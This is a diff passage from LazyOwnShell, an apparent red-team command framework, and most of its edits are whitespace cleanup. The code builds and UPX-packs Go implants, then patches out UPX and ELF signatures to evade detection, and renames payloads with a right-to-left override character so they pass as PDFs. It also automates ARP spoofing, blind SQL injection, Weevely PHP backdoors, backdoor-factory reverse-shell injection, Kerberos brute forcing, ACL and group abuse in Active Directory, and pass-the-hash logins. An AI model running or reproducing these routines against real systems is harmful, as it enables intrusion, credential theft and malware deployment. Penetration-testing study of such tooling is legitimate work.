         #lateral_content = lateral_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
         lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
@@ -10898,13 +10900,13 @@ class LazyOwnShell(cmd2.Cmd):
             implantgo += ".exe"
             implantgo2 += "_l.exe"
             #implantgo_ws += ".exe"
-            
+
         with open(implant_go, 'w+') as f:
             f.write(content)
-            
+
         #with open(implant_go_ws, 'w+') as f:
-        #    f.write(content_ws)    
-                
+        #    f.write(content_ws)
+
         with open(f"{implant_go2}", 'w+') as f:
             f.write(lcontent)
 
@@ -10912,7 +10914,7 @@ class LazyOwnShell(cmd2.Cmd):
         #    f.write(lateral_content)
 
         with open(f"{monrevlin}", 'w+') as f:
-            f.write(monrevlin_content)    
+            f.write(monrevlin_content)
         cmd = "cd sessions ; rm go.mod ; go mod init implant"
         self.cmd(cmd)
         if platform == "linux":
@@ -10932,7 +10934,7 @@ class LazyOwnShell(cmd2.Cmd):
             #self.cmd(compile_command3)
             self.cmd(compile_command4)
             #self.cmd(compile_command_ws)
-            
+
             self.cmd(cplib)
             self.onecmd(f"service {line}")
             self.onecmd(f"service l_{line}")
@@ -10943,14 +10945,14 @@ class LazyOwnShell(cmd2.Cmd):
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
             upx = f"upx {self.sessions_dir}/monrev"
-            self.cmd(upx) 
+            self.cmd(upx)
             cmd_anti_upx = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "'+line+'"'
             cmd_ant_elf = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "'+line+'"'
-            self.cmd(cmd_anti_upx) 
-            self.cmd(cmd_ant_elf) 
+            self.cmd(cmd_anti_upx)
+            self.cmd(cmd_ant_elf)
             cmd_anti_upx = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "monrev"'
             cmd_ant_elf = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "monrev"'
-            self.cmd(cmd_anti_upx) 
+            self.cmd(cmd_anti_upx)
             self.cmd(cmd_ant_elf)
 
         elif platform == "windows":
@@ -10988,7 +10990,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(upx)
             new_binary = f"{self.sessions_dir}/{binary}"
             newname = (new_binary.split('.')[0] + u'\u202e' + ".pdfx"[::-1]  + new_binary.split('.')[1]).encode('utf-8')
-    
+
             print_msg("New Camuflage File " + str(newname))
             shutil.copy(file, newname)
 
@@ -11046,7 +11048,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(compile_command2)
             #self.cmd(compile_command3)
             upx = f"upx {self.sessions_dir}/{binary}"
-            self.cmd(upx)                    
+            self.cmd(upx)
 
         print_msg(f"Go agent {implantgo} compiled successfully.")
         cmd_fmt = f"go fmt {implant_go}"
@@ -11082,16 +11084,16 @@ class LazyOwnShell(cmd2.Cmd):
             json.dump(json_content, f, indent=4)
 
         json_file = self.sessions_dir + "/phishing/campaigns/short_urls.json"
-        
+
         if not os.path.exists(json_file):
             short_urls = {}
         else:
             with open(json_file, 'r') as f:
                 short_urls = json.load(f)
-        
+
         if line in short_urls:
             print_warn(f"Entry '{line}' already exists in short urls")
-            
+
 
         new_entry = {
             line: {
@@ -11100,11 +11102,11 @@ class LazyOwnShell(cmd2.Cmd):
                 "created_at": datetime.now().isoformat()
             }
         }
-        
+
         short_urls.update(new_entry)
         with open(json_file, 'w') as f:
             json.dump(short_urls, f, indent=2)
-        
+
         print_msg(f"Created new entry for '{line}' in shorts urls")
 
         self.onecmd("create_session_json")
@@ -11144,7 +11146,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Raises:
             Exception: If any error occurs during the execution of the function.
-        """        
+        """
         try:
             check_sudo()
             command="""sudo arp -a | awk '{print "IP: " $2 " MAC: " $4}'"""
@@ -11153,9 +11155,9 @@ class LazyOwnShell(cmd2.Cmd):
             choice = input(f"    {CYAN}[!] Set up ip and mac Example (IP: (192.168.1.100) MAC: de:ad:be:ef:00:00): {RESET}")
             target_ip, target_mac = parse_ip_mac(choice)
             if target_ip and target_mac:
-                print(f"IP: {target_ip}, MAC: {target_mac}")       
-            gateway_ip = "192.168.1.1" 
-            my_mac = "00:11:22:33:44:55" 
+                print(f"IP: {target_ip}, MAC: {target_mac}")
+            gateway_ip = "192.168.1.1"
+            my_mac = "00:11:22:33:44:55"
             print_msg("Available Interfaces: ")
             command = "ip link show | grep -E '^[0-9]+: ' | awk -F': ' '{print $2}'"
             self.cmd(command)
@@ -11168,14 +11170,14 @@ class LazyOwnShell(cmd2.Cmd):
             packet = create_arp_packet(my_mac, gateway_ip, target_ip, target_mac)
             send_packet(packet, iface)
             print(f"Sent spoofing packet to {target_ip} with MAC {target_mac}")
-        
+
         except Exception as e:
             print(f"Error: {e}")
 
     @cmd2.with_category(exploitation_category)
     def do_sqli(def_func, line):
         """
-        Asks the user for the URL, database, table, and columns, and then executes the Python script 
+        Asks the user for the URL, database, table, and columns, and then executes the Python script
         'modules/lazybsqli.py' with the provided parameters.
 
         Parameters:
@@ -11185,7 +11187,7 @@ class LazyOwnShell(cmd2.Cmd):
         Example:
         - do_bsqli(None, None)
         """
-        
+
         # Solicitar parámetros al usuario
         url = input("Enter the URL (e.g., http://example.com/page.php): ")
         db = input("Enter the name of the database: ")
@@ -11208,7 +11210,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Script Error : {e}")
         except Exception as e:
             print_error(f"Unexpected Error: {e}")
-    
+
     @cmd2.with_category(credential_access_category)
     def do_sshkey(self, line)            :
         """
@@ -11235,7 +11237,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Generate a custom dictionary using the `crunch` tool.
 
-        This function creates a wordlist with a specified length using the `crunch` command. 
+        This function creates a wordlist with a specified length using the `crunch` command.
         It allows the user to specify a custom character pattern for the wordlist.
 
         :param line: The length of the strings to be generated (e.g., '6' for 6-character strings).
@@ -11261,17 +11263,17 @@ class LazyOwnShell(cmd2.Cmd):
 
         default_pattern = "0123456789abcdefghijklmnñopqrstuvxyz,.-#$%@"
         print_msg(f"Default pattern: {default_pattern}")
-        
+
         choice_patt = input(f"    [?] Press Enter to use the default pattern, or enter a custom pattern: ")
-        
+
         pattern = choice_patt if choice_patt else default_pattern
         print_msg(f"Using pattern: {pattern}")
-        
+
         command = f"crunch {line} {line} {pattern} -o sessions/dict_{line}.txt"
         self.cmd(command)
 
         return
-    
+
     @cmd2.with_category(reporting_category)
     def do_malwarebazar(self, line):
         """
@@ -11302,7 +11304,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
             None
-        """        
+        """
         file = f"sessions/{line}.json"
         command = f'curl -o {file} -X POST -d "query=get_taginfo&tag={line}&limit=50" https://mb-api.abuse.ch/api/v1/'
         run(command)
@@ -11312,7 +11314,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         with open(file, 'r') as f:
             data = json.load(f)
-            
+
         if data.get("query_status") == "no_results":
             print_warn("Warning: No results found.")
             return
@@ -11328,7 +11330,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"First Seen: {BLUE}{file_info.get('first_seen')}")
             print_msg(f"Signature: {BLUE}{file_info.get('signature')}")
             print_msg(f"Tags: {BLUE}{', '.join(file_info.get('tags', []))}")
-            
+
             intelligence = file_info.get('intelligence', {})
             clamav_results = intelligence.get('clamav', [])
             if clamav_results:
@@ -11343,9 +11345,9 @@ class LazyOwnShell(cmd2.Cmd):
     def do_download_malwarebazar(self, line):
         """Download a malware sample from MalwareBazaar using its SHA256 hash.
 
-        This function allows the user to download a malware sample from MalwareBazaar by providing 
-        the SHA256 hash of the desired file. If the hash is not provided as an argument, the function 
-        will prompt an error message indicating the correct usage. The downloaded malware sample 
+        This function allows the user to download a malware sample from MalwareBazaar by providing
+        the SHA256 hash of the desired file. If the hash is not provided as an argument, the function
+        will prompt an error message indicating the correct usage. The downloaded malware sample
         will be saved as a zipped file (`malware.zip`) and will be password protected.
 
         Arguments:
@@ -11358,7 +11360,7 @@ class LazyOwnShell(cmd2.Cmd):
         >>> download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d
 
         Notes:
-        - Ensure that the SHA256 hash provided is correct and that it corresponds to a file available 
+        - Ensure that the SHA256 hash provided is correct and that it corresponds to a file available
         on MalwareBazaar.
         - The downloaded file will be password protected using the password "infected".
         - To obtain the SHA256 hash of malware samples, refer to the `help malwarebazar` command.
@@ -11425,9 +11427,9 @@ class LazyOwnShell(cmd2.Cmd):
         It first checks if the 'url' parameter is set. If not, it prints an error message.
         If the 'url' is set, it extracts the domain from the URL using the get_domain function.
         Then, it constructs a 'cewl' command with the specified parameters and prepares it for execution.
-        
+
         Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (https://example.com):
-        
+
         Parameters:
         line (str): The command line input for this function.
 
@@ -11437,7 +11439,7 @@ class LazyOwnShell(cmd2.Cmd):
         Example usage:
         - assign url http://example.com
         - do_cewl
-        """        
+        """
         extra = ""
         url = self.params["url"]
         if not url:
@@ -11473,7 +11475,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(command)
             self.cmd(command)
             return
-        
+
     @cmd2.with_category(scanning_category)
     def do_dmitry(self, line):
         """
@@ -11481,9 +11483,9 @@ class LazyOwnShell(cmd2.Cmd):
         It first checks if the 'url' parameter is set. If not, it prints an error message.
         If the 'url' is set, it extracts the domain from the URL using the get_domain function.
         Then, it constructs a 'dmitry' command with the specified parameters and prepares it for execution.
-        
+
         Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:
-        
+
         Parameters:
         line (str): The command line input for this function.
 
@@ -11493,7 +11495,7 @@ class LazyOwnShell(cmd2.Cmd):
         Example usage:
         - assign url http://example.com
         - do_dmitry
-        """        
+        """
         if not is_binary_present("dmitry"):
             print_warn("Installing dmitry...")
             self.cmd("sudo apt install dmitry -y")
@@ -11503,7 +11505,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Url must be assign use{GREEN} assign url http://example.com")
             return
         domain = get_domain(url)
-        
+
         command = f"dmitry -winseo sessions/dmitry_{domain}.txt {domain}"
         print_msg(command)
         self.cmd(command)
@@ -11514,21 +11516,21 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Executes the graudit command to perform a static code analysis with the specified options.
 
-        This function runs the 'graudit' tool with the '-A' option for an advanced scan and 
-        the '-i sessions' option to include session files. The results will be displayed 
+        This function runs the 'graudit' tool with the '-A' option for an advanced scan and
+        the '-i sessions' option to include session files. The results will be displayed
         directly in the terminal.
 
         Args:
-            line (str): Input line from the command interface. This argument is currently 
-                        not used within the function but is required for the command 
+            line (str): Input line from the command interface. This argument is currently
+                        not used within the function but is required for the command
                         interface structure.
-                        
+
         Example:
             To run this function from the command interface, simply type 'graudit' and press enter.
             The function will execute the 'graudit -A -i sessions' command.
 
         Note:
-            Ensure that 'graudit' is installed and properly configured in your system's PATH 
+            Ensure that 'graudit' is installed and properly configured in your system's PATH
             for this function to work correctly.
         """
 
@@ -11539,7 +11541,7 @@ class LazyOwnShell(cmd2.Cmd):
         command = "graudit -A -i sessions"
         self.cmd(command)
         return
-    
+
     @cmd2.with_category(command_and_control_category)
     def do_msfrpc(self, line):
         """
@@ -11562,7 +11564,7 @@ class LazyOwnShell(cmd2.Cmd):
         try:
             subprocess.run(cmd, check=True)
         except subprocess.CalledProcessError as e:
-            print_error(f"Error connecting to msfrpcd: {e}") 
+            print_error(f"Error connecting to msfrpcd: {e}")
 
     @cmd2.with_category(scanning_category)
     def do_nuclei(self, line):
@@ -11597,7 +11599,7 @@ class LazyOwnShell(cmd2.Cmd):
                 self.cmd("cd .. && git clone https://github.com/projectdiscovery/nuclei-templates.git 2>/dev/null")
             path = input("    [!] Enter the path to templates (default ../nuclei-templates): ") or '../nuclei-templates'
             cmd = ["nuclei", "-t", path, "-u", rhost, "-o", output_file, '-tags', 'cve']
-        else:        
+        else:
             cmd = ["nuclei", "-u", rhost, "-o", output_file, '-tags', 'cve']
         try:
             print_msg(cmd)
@@ -11620,17 +11622,17 @@ class LazyOwnShell(cmd2.Cmd):
         if not is_binary_present("parsero"):
             print_warn("Installing parsero...")
             self.cmd("sudo apt install parsero -y")
-            
+
         if line:
             rhost = line
         else:
             rhost = self.params["rhost"]
             if not check_rhost(rhost):
                 return
-        
+
         output_file = f"sessions/{rhost}_parsero_output.txt"
         cmd = ["parsero", "-u", rhost, "-sb"]
-        
+
         try:
             with open(output_file, 'w') as f:
                 subprocess.run(cmd, check=True, stdout=f, stderr=subprocess.STDOUT)
@@ -11643,12 +11645,12 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Executes the Sherlock tool to find usernames across social networks.
 
-        This function takes a username as an argument and runs the Sherlock tool 
-        to check for the username's presence on various social networks. The 
+        This function takes a username as an argument and runs the Sherlock tool
+        to check for the username's presence on various social networks. The
         results are saved in CSV format in the `sessions` directory.
 
         Parameters:
-        line (str): The username to be checked by Sherlock. If not provided, an 
+        line (str): The username to be checked by Sherlock. If not provided, an
                     error message is printed and the function returns.
 
         Returns:
@@ -11664,7 +11666,7 @@ class LazyOwnShell(cmd2.Cmd):
         Additional Notes:
         - The Sherlock tool must be installed and available in the system path.
         - The results are saved in the `sessions` directory as a CSV file.
-        - The `--local` flag forces the use of a local `data.json` file, 
+        - The `--local` flag forces the use of a local `data.json` file,
         which should be present in the appropriate directory.
         """
         if not is_binary_present("sherlock"):
@@ -11682,9 +11684,9 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(recon_category)
     def do_trufflehog(self, line):
         """
-        Executes trufflehog to search for secrets in a given Git repository URL. 
-        If trufflehog is not installed, it installs the tool automatically. 
-        This function navigates to the 'sessions' directory and runs trufflehog 
+        Executes trufflehog to search for secrets in a given Git repository URL.
+        If trufflehog is not installed, it installs the tool automatically.
+        This function navigates to the 'sessions' directory and runs trufflehog
         with the provided Git URL, outputting the results in JSON format.
 
         Args:
@@ -11703,7 +11705,7 @@ class LazyOwnShell(cmd2.Cmd):
             - Ensure that trufflehog is installed or it will be installed automatically.
             - The output of the trufflehog scan is printed and executed in the 'sessions' directory.
         """
-        
+
         if not is_binary_present("trufflehog"):
             print_warn("installing trufflehog...")
             self.cmd("sudo apt install trufflehog -y")
@@ -11711,7 +11713,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not line:
             print_error("You must pass the git url like argument.")
             return
-       
+
         command = f"cd sessions && trufflehog git {line} --json"
         print_msg(f"trufflehog git {line} --json")
         self.cmd(command)
@@ -11722,7 +11724,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Generate a PHP backdoor using Weevely, protected with the given password.
 
-        This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 
+        This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically.
 
         Usage:
         ┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
@@ -11749,7 +11751,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not line:
             print_error("You must pass the password of weevly shell as an argument. example: weevelygen s3cr3t")
             return
-        
+
         name = input("    [!] Enter the file name: (default: weevely.php)") or 'weevely.php'
         command = f"cd sessions && weevely generate {line} {name}"
         print_msg(f"weevely generate {line} {name}")
@@ -11757,12 +11759,12 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Now you can run: weevely http//:victim.local/{name} {line}")
         return
 
-    @cmd2.with_category(persistence_category)    
+    @cmd2.with_category(persistence_category)
     def do_weevely(self, line):
         """
         Connect to PHP backdoor using Weevely, protected with the given password.
 
-        This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 
+        This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically.
 
         Usage:
         ┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
@@ -11789,7 +11791,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not line:
             print_error("You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t")
             return
-        
+
         args = line.split(" ")
 
         if len(args) == 2:
@@ -11817,19 +11819,19 @@ class LazyOwnShell(cmd2.Cmd):
         if not is_binary_present("changeme"):
             print_warn("Installing changeme...")
             self.cmd("sudo apt install changeme -y")
-            
+
         if line:
             rhost = line
         else:
             rhost = self.params["rhost"]
             if not check_rhost(rhost):
                 return
-        
+
         output_file = f"sessions/{rhost}_changeme_output"
         cmd = ["changeme", "-a", "-o", output_file, "--oa", "-t", "20", rhost]
         try:
             subprocess.run(cmd, check=True)
-           
+
         except subprocess.CalledProcessError as e:
             print_error(f"Error running changeme scan: {e}")
         return
@@ -11871,7 +11873,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Try... enum4linux-ng -A {rhost} -oY sessions/{rhost}_enum4linux-ng {RESET}")
         self.cmd(f"enum4linux-ng -A {rhost} -oY sessions/{rhost}_enum4linux-ng")
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_fuzz(self, line):
         """
@@ -11916,7 +11918,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Try... {cmd} {RESET}")
         self.cmd(cmd)
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_sharpshooter(self, line):
         """
@@ -11926,7 +11928,7 @@ class LazyOwnShell(cmd2.Cmd):
         Usage:
             sharpshooter [-o <output file>] --oa -t 20 rhost
 
-        This function installs SharpShooter if it is not already installed, prompts the user for the payload type, 
+        This function installs SharpShooter if it is not already installed, prompts the user for the payload type,
         and then runs SharpShooter to create a payload based on the specified type.
 
         Parameters:
@@ -11942,7 +11944,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not is_binary_present("sharpshooter"):
             print_warn("Installing sharpshooter...")
             self.cmd("sudo apt install sharpshooter -y")
-        
+
         path = os.getcwd()
         file = f"{path}/sessions/shellcode.bin"
 
@@ -11970,7 +11972,7 @@ class LazyOwnShell(cmd2.Cmd):
             sliver-client [command]
 
         This function installs Sliver if it is not already installed, starts the Sliver server,
-        generates the necessary certificates, and creates a client configuration file. 
+        generates the necessary certificates, and creates a client configuration file.
         It also provides options to download the client for different operating systems.
 
         Parameters:
@@ -11986,7 +11988,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not is_binary_present("sliver-server"):
             print_warn("Installing sliver-server...")
             self.cmd("sudo apt install sliver-server -y")
-        
+
         rhost = self.params["rhost"]
         if not check_rhost(rhost):
             return
@@ -11994,16 +11996,16 @@ class LazyOwnShell(cmd2.Cmd):
         lhost = self.params["lhost"]
         if not check_lhost(lhost):
             return
-  
+
         lport = self.params["lport"]
         if not check_lport(lport):
-            return       
+            return
         path = os.getcwd()
         if not line:
             print_error("You need pass hte name of the victim")
             return
 
-        
+
 
         print_msg("download the sliver client")
         time.sleep(3)
@@ -12045,7 +12047,7 @@ class LazyOwnShell(cmd2.Cmd):
             mtls
             jobs
             """.replace("        ","")
-            
+
             copy2clip(command)
 
         elif choice == "2":
@@ -12055,7 +12057,7 @@ class LazyOwnShell(cmd2.Cmd):
             mtls
             jobs
             """.replace("        ","")
-            
+
             copy2clip(command)
 
         elif choice == "3":
@@ -12075,12 +12077,12 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_gencert(self, line):
         """
         Generates a certificate authority (CA), client certificate, and client key.
-        
+
         Returns:
             str: Paths to the generated CA certificate, client certificate, and client key.
         """
@@ -12106,7 +12108,7 @@ class LazyOwnShell(cmd2.Cmd):
         None
 
         Example:
-        To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path, 
+        To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path,
         then run this function to perform the enumeration.
 
         Note:
@@ -12132,7 +12134,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         path_cred = "sessions/credentials.txt"
-        
+
         if line == "pass":
             if not os.path.exists(path_cred):
                 print_error("you need credentials.txt exec: createcredentials admin:admin")
@@ -12156,7 +12158,7 @@ class LazyOwnShell(cmd2.Cmd):
                     user = user.strip()
                     command = f"{kerbrute_dir}/kerbrute bruteuser --dc {rhost} -d {domain} -t 20 -v {wordlist} {user}   | tee sessions/kerbrute_{rhost}_{line}.txt"
                     print_msg(command)
-                    self.cmd(command)                
+                    self.cmd(command)
         else:
             choice_dc = input("    [!] Do you wanna use dc option ? (y/n): ") or "n"
             if choice_dc == "y":
@@ -12179,7 +12181,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Execute the dacledit.py command for a specific user or all users listed in the users.txt file.
 
-        This function interacts with the DACL editor to modify access control lists in an Active Directory environment. 
+        This function interacts with the DACL editor to modify access control lists in an Active Directory environment.
         It allows the user to select a specific user from the list or execute the command for all users.
         Install impacket suit to get this script in the examples
         Args:
@@ -12198,14 +12200,14 @@ class LazyOwnShell(cmd2.Cmd):
 
         Raises:
             FileNotFoundError: If the users.txt file does not exist.
-        
+
         Example:
             To execute the command for a specific user:
             >>> do_dacledit("MARKETING DIGITAL")
 
             To execute the command for all users:
             >>> do_dacledit("")
-        """        
+        """
         url = self.params["url"]
         rhost = self.params["rhost"]
         path = os.getcwd()
@@ -12241,7 +12243,7 @@ class LazyOwnShell(cmd2.Cmd):
             for user in users:
                 command = f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{domain}/{user}' -k -no-pass -dc-ip {rhost}"
                 print_msg(command)
-                self.cmd(command) 
+                self.cmd(command)
         return
 
     @cmd2.with_category(lateral_movement_category)
@@ -12253,7 +12255,7 @@ class LazyOwnShell(cmd2.Cmd):
         It allows the user to select a specific user from the list or execute the command for all users.
         (use download_external option 48 to clone the repo)
         Args:
-            line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'. 
+            line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'.
                         If not provided, the user is prompted to enter it.
 
         Returns:
@@ -12269,7 +12271,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Raises:
             FileNotFoundError: If the users.txt file does not exist.
-        
+
         Example:
             To execute the command for a specific user:
             >>> do_bloodyAD("")
@@ -12308,13 +12310,13 @@ class LazyOwnShell(cmd2.Cmd):
             ext = ca[1].upper()
             if not check_rhost(rhost):
                 return
-            
+
             cn = input("    [!] Enter CN= example CHIEFS MARKETING: ")
 
             if not os.path.exists(users_txt):
                 print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
                 return
-    
+
             with open(users_txt, "r") as file:
                 users = [user.strip() for user in file]
 
@@ -12333,7 +12335,7 @@ class LazyOwnShell(cmd2.Cmd):
                 for user in users:
                     command = f"export KRB5CCNAME=/tmp/{user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
                     print_msg(command)
-                    self.cmd(command) 
+                    self.cmd(command)
         return
 
     @cmd2.with_category(exfiltration_category)
@@ -12357,7 +12359,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
         None
-        """   
+        """
         rhost = self.params["rhost"]
         path = os.getcwd()
         users_txt = f"{path}/sessions/users.txt"
@@ -12395,7 +12397,7 @@ class LazyOwnShell(cmd2.Cmd):
                     ps1 = ""
             if not credentials:
                 print_error(f"error {credentials}")
-                return  
+                return
             for user, passwd in credentials:
                 command = f"cd sessions && evil-winrm -i {rhost} -u {user} -p '{passwd}' {ps1}"
                 print_msg(command)
@@ -12408,7 +12410,7 @@ class LazyOwnShell(cmd2.Cmd):
             hash_txt = get_hash()
             if not hash_txt:
                 return
-            
+
             user = input("    [!] Enter Username (default: Administrator)") or 'Administrator'
             command = f"evil-winrm -i {rhost} -u {user} -H '{hash_txt}'"
             print_msg(command)
@@ -12417,7 +12419,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("Uso incorrecto. Usa 'pass' para autenticar o 'hash' para usar hashes.")
             return
-        
+
     @cmd2.with_category(lateral_movement_category)
     def do_getTGT(self, line):
         """
@@ -12440,12 +12442,12 @@ class LazyOwnShell(cmd2.Cmd):
         rhost = self.params["rhost"]
         path = os.getcwd()
         users_txt = f"{path}/sessions/users.txt"
-        
+
         if not check_rhost(rhost):
             return
 
-        path_cred = "sessions/credentials.txt"        
-       
+        path_cred = "sessions/credentials.txt"
+
         if not os.path.exists(path_cred):
             print_error("you need credentials.txt exec: createcredentials admin:admin")
             return
@@ -12464,9 +12466,9 @@ class LazyOwnShell(cmd2.Cmd):
                 cmd = f"mv {user}.ccache {tmp}"
                 print_msg(cmd)
                 self.cmd(cmd)
-        
+
         return
-    
+
     @cmd2.with_category(recon_category)
     def do_apache_users(self, line):
         """
@@ -12492,7 +12494,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not is_binary_present("apache-users"):
             print_warn("Installing apache-users...")
             self.cmd("sudo apt install apache-users -y")
-        
+
         usrwordlist = self.params["usrwordlist"]
         if not usrwordlist:
             print_error("User wordlist must be assigned, use: assign usrwordlist /path/to/wordlist")
@@ -12519,11 +12521,11 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Creates a backdoored executable using `backdoor-factory`.
 
-        This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to 
-        inject a reverse shell payload into a specified binary file. The binary is backdoored with a 
+        This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to
+        inject a reverse shell payload into a specified binary file. The binary is backdoored with a
         reverse shell payload that connects back to a specified host and port.
 
-        :param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted 
+        :param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted
                     to enter the path.
 
         :returns: None
@@ -12532,8 +12534,8 @@ class LazyOwnShell(cmd2.Cmd):
         To manually create a backdoored executable, use the following command:
             backdoor-factory -f <file_path> -H <lhost> -P <lport> -s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file>
 
-        Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of 
-        the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path 
+        Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of
+        the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path
         where the backdoored binary will be saved.
 
         For example:
@@ -12565,10 +12567,10 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Tests WebDAV server configurations using `davtest`.
 
-        This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest` 
+        This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest`
         to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.
 
-        :param line: The URL of the WebDAV server to test. If provided, it overrides the default URL. 
+        :param line: The URL of the WebDAV server to test. If provided, it overrides the default URL.
                     If not provided, the function uses the URL specified in `self.params["rhost"]`.
 
         :returns: None
@@ -12595,7 +12597,7 @@ class LazyOwnShell(cmd2.Cmd):
             if not check_rhost(rhost):
                 return
 
-  
+
         print_msg(f"Try... davtest --url {rhost} {RESET}")
         self.cmd(f"davtest --url {rhost}")
         print_msg(f"Try... davtest --url {url} {RESET}")
@@ -12680,9 +12682,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"Generating payload with MSFPC: {msfpc_command}")
         self.cmd(msfpc_command)
-        
+
         return
-    
+
     @cmd2.with_category(persistence_category)
     def do_ivy(self, line):
         """
@@ -12715,7 +12717,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd("go get github.com/fatih/color")
             self.cmd("go get github.com/KyleBanks/XOREncryption/Go")
             self.cmd("go build Ivy.go")
-        
+
 
         options = {
             "staged_inject": {
@@ -12780,9 +12782,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"Generating payload with Ivy: {ivy_command}")
         self.cmd(ivy_command)
-        
+
         return
-    
+
     @cmd2.with_category(lateral_movement_category)
     def do_tord(self, line):
         """
@@ -12793,7 +12795,7 @@ class LazyOwnShell(cmd2.Cmd):
         The command is then printed and executed.
 
         Parameters:
-        line (str): Defaults to "80" 
+        line (str): Defaults to "80"
 
         Returns:
         None
@@ -12806,7 +12808,7 @@ class LazyOwnShell(cmd2.Cmd):
         sudo bash sessions/tor.sh
 
         Note:
-        Ensure that the `tor.sh` script exists in the `sessions` directory and that you have the 
+        Ensure that the `tor.sh` script exists in the `sessions` directory and that you have the
         necessary permissions to execute scripts with `sudo`.
         """
         if not line:
@@ -12823,9 +12825,9 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Generates a wordlist based on a target name and a list of characters, with various combinations.
 
-        This function prompts the user for a target name and a wordlist name, then generates various combinations 
